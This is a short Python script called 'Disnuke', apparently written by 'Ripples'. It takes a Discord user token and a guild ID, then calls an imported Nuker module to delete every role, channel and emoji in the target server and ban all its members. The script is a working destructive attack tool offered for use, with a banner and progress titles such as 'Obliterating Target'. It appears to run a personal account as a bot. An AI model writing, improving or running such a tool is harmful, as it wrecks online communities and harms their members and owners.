from os import system
import discord
from colorama import Fore, init, Style
from nuker import Nuker

client = discord.Client()

def update_title(title: str):
    system("title " + title)

update_title('Disnuke - Getting info..')

print(f"""{Fore.MAGENTA}


████████████████████████████████████████████████
█▄─▄▄▀█▄─▄█─▄▄▄▄█─▄▄▄─█▄─▄███─▄▄─█▄─▀█▄─▄█▄─▄▄─█
██─██─██─██▄▄▄▄─█─███▀██─██▀█─██─██─█▄▀─███─▄█▀█
▀▄▄▄▄▀▀▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▀▄▄▄▀▀▄▄▀▄▄▄▄▄▀

{Style.RESET_ALL}
                                                            {Fore.MAGENTA}Developed by Ripples.{Style.RESET_ALL}
        """)
token = input(f'🔮 Enter your Discord User\'s token 🔮:\n >')


print("  ")
print("  ")

@client.event
async def on_ready():    
    update_title(f'Disnuke - Using {client.user}.')

    print("NOTE: I\'ve had to make this slower so my goofy ahh doesn\'t get rate limited. This'll be a little slow.")
    
    guild = client.get_guild(int(input('🔮 Right, what\'s the Guild ID to nuke? 🔮:\n >')))

    update_title(f'Disnuke - Obliterating Target')
    await Nuker.roles_delete(guild)
    await Nuker.channels_delete(guild)
    await Nuker.emojis_delete(guild)
    await Nuker.ban_all(guild)
    update_title('Disnuke - Finished')

    # await asyncio.sleep(5)
    await client.close()


client.run(token)